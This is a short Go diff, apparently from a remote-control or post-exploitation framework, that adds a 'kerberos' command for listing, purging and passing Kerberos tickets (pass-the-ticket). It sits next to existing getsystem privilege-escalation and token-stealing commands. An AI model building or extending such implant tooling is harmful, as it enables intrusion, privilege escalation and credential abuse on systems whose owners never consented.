@@ -89,6 +89,8 @@ var commandTable = []cmdSpec{
 	// 注意必须在这里显式登记：漏了会落到下面的"默认 SHELL"分支，把 getsystem
 	// 当 shell 命令发给 cmd.exe，客户端的 GETSYSTEM 分支永远收不到（实测踩过）。
 	{prefix: "getsystem ", typ: command1.GETSYSTEM, build: rawArg},
+	// Kerberos 票据动作（阶段三）：kerberos list|purge [服务名]|ptt <base64>
+	{prefix: "kerberos ", typ: command1.KERB_ACTION, build: rawArg},
 	// Token 操作链（A8）
 	{prefix: "make_token ", typ: command1.MAKE_TOKEN, build: rawArg},
 	{prefix: "steal_token ", typ: command1.STEAL_TOKEN, build: rawArg},
@@ -123,6 +125,8 @@ var exactCommands = map[string]uint32{
 	"hidenet":                     command1.HIDE_NET,
 	// 提权（阶段三）：不带参数时客户端默认 auto
 	"getsystem": command1.GETSYSTEM,
+	// Kerberos 票据动作：不带参数 = list
+	"kerberos": command1.KERB_ACTION,
 	// Token 操作链（A8）：make_token/steal_token 带参数走前缀表
 	"rev2self": command1.REV2SELF,
 }
